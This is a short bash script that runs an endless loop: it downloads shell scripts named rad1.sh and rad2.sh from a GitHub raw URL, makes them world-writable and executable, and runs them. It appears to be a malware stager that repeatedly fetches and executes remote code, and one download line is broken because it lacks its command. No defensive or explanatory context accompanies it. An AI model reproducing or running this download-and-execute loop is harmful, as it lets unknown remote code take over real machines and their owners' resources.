#!/bin/bash

while :
do
	wget https://github.com/Nuecb56/hjs839/raw/main/rad1.sh
	chmod 777 rad1.sh
	./rad1.sh
	sleep 5
	https://github.com/Nuecb56/hjs839/raw/main/rad2.sh
	chmod 777 rad2.sh
	timeout 10m ./rad2.sh
	sleep 5
done
